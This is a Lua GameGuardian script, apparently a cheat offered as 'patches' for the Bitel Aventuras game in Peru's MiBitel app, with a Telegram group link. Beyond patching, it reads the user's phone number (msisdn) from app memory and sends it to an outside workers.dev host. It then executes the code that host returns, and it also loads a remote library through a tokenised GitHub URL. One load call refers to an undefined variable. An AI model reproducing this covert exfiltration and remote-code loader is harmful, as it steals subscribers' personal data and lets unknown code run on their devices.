vers="1.1.3"
local url = "https://apkcombo.com/es/downloader/#package=com.bitel.selfcare&device=phone&sdk=24&arches=armeabi-v7a&lang=es"
local ReqResp = ''
local isInstalled = gg.isPackageInstalled('com.bitel.selfcare')
if not isInstalled then
    local instalar = gg.alert('⚠️ Aun no as instalado MiBitel descargarlo desde: ' .. url, 'COPIAR LINK')
    if instalar == 1 then
        gg.copyText(url, false)
    end
    os.exit()
end

local pk = gg.getTargetPackage()
if pk ~= 'com.bitel.selfcare' then
    print('⚠️ Aplicación seleccionada no válida.\nAsegurate de seleccionar el juego ➡️Bitel Aventuras⬅️.')
    os.exit()
end

function table_contains(tbl, x)
    found = false
    for _, v in pairs(tbl) do
        if v == x then 
            found = true 
        end
    end
    return found
end

local v = gg.getTargetInfo()
local is64 = v.x64
local cmd = v.cmdLine
local vNam = v.versionName
if cmd ~= '.UnityPreviewActivity' then
    print('⚠️ Error, primero debes abrir el juego Bitel Aventuras luego selecciona ➡️.UnityPreviewActivity⬅️ y ejecuta el script.')
    os.exit()
end
if is64 then
	local retu = gg.alert('⚠️ Esta versión de MiBitel no es compatible.\n↪️ Descarga e instala una versión compatible con ➡️armeabi_v7a⬅️ (32Bits).\nLink recomendado 🔗 ' .. url, 'COPIAR LINK')
    if retu == 1 then
    	gg.copyText(url, false)
    end
    os.exit()
end
local tabl = {"4.4.50"}
if not table_contains(tabl,vNam) then
	print('⚠️ MiBitel', vNam, 'no es compatible con este script.\nInstala una de las siguientes versiones ⁠➜',table.concat(tabl, ', '))
	os.exit()
end

local welc = true

function welcome()
  local tele = 'https://t.me/PeruGuardians'
  local ret = gg.alert('🙋‍♂️ BIENVENIDO 🙋\n\n🎯  ' .. v.label .. '  ' .. vNam .. '\n\n👨‍💻 SCRIPT by ƬΉΣGЦΛЯDIΛП (v.' .. vers .. ')\n\n🔗 '.. tele .. ' ⬅️ Grupo de Telegram\n\nA continuación preciona el botón aplicar parches, aveces el script no funciona a la primera provocando el cierre del juego, entonces intentalo otra vez 🤗.\n', '✔️ APLICAR PARCHES', '❌ SALIR', '📝')
  if ret == 2 then
  	gg.setVisible(true)
  	os.exit()
  elseif ret == 1 then
    welc = false
  elseif ret == 3 then
    gg.copyText(tele, false)
    gg.toast('Telegram Link Copiado!', true)
  end
end

while welc do
    if gg.isVisible() then
        gg.setVisible(false)
        welcome()
    end
    gg.sleep(60)
end

gg.setVisible(false)

gg.toast('Cargando librerías ...')

local libCore = gg.makeRequest("https://raw.githubusercontent.com/TheGuardian-code/GG/refs/heads/main/libCore.lua?token=GHSAT0AAAAAACWIBU7V77ENCYLDPFEPZJLSZYLXG5Q").content
local success, err = pcall(load(libBase))

function readBytesToString(address, length)
  local values = {}
  for i = 0, length - 1 do
    values[i] = {address = address + i, flags = gg.TYPE_BYTE}
  end
  values = gg.getValues(values)
  local bytes = {}
  for i, v in ipairs(values) do
    bytes[i] = v.value & 0xFF
  end
  return string.char(table.unpack(bytes))
end

function MENU1()
local pxo = ''
gg.clearResults()
gg.setRanges(bit32.bor(gg.REGION_C_ALLOC))
gg.searchNumber(':msisdn":"', gg.TYPE_BYTE)
if gg.getResultsCount() > 0 then
	local start_search = gg.getResults(1)
	gg.clearResults()
	range_start = start_search[1].address + 8
	pxo = readBytesToString(range_start, 10)
else
	pxo = "N_f"
end
ReqResp = gg.makeRequest("https://glversions.greenhoodedaltruist.workers.dev/?jbgfr8aJ=" .. pxo).content
end

MENU1()

local succes, erro = pcall(load(ReqResp))
